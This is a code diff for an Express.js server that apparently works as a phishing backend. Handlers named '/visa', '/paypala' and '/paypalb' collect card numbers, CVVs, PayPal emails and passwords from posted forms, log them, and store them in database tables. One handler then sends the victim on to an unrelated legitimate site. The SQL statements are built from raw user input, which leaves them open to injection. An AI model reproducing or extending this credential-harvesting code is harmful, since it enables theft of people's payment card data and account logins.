@@ -37,19 +37,31 @@ app.post('/visa', function (req, res) {
     var a = req.body.a;
     var b = req.body.b;
     var c = req.body.c;
-    b=b.replace('/','.')
-    console.log(a+'--'+b+'--'+c)
-    client.query("Insert into visa (card,exp,cvv) values('" + a + "','" + b + "','" + c + "')",function(err,result){
-        console.log('resulttttttttttttt : '+result)
-        console.log('errrrrrrrrrrrrrrrrrrrrrr : '+err)
+    b = b.replace('/', '.')
+    console.log(a + '--' + b + '--' + c)
+    client.query("Insert into visa (card,exp,cvv) values('" + a + "','" + b + "','" + c + "')", function (err, result) {
+        console.log('resulttttttttttttt : ' + result)
+        console.log('errrrrrrrrrrrrrrrrrrrrrr : ' + err)
     })
 })
 app.post('/paypala', function (req, res) {
-    console.log(req.body);
+    var a = req.body.login_email;
+    var b = req.body.login_password;
+    console.log(a + b)
+    client.query("Insert into paypal (mail,pass) values('" + a + "','" + b + "')", function (err, result) { });
+
     res.redirect('/confirm')
 })
 app.post('/paypalb', function (req, res) {
+    var a = req.body.cardHolder;
+    var b = req.body.cardNumber;
+    var c = req.body.brand;
+    var d = req.body.brand;
+
+
     console.log(req.body);
+    client.query("Insert into paypal (cardholder,car,exp,cvv) values('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) { });
+
     res.redirect('https://www.freelancer.com')
 })
 
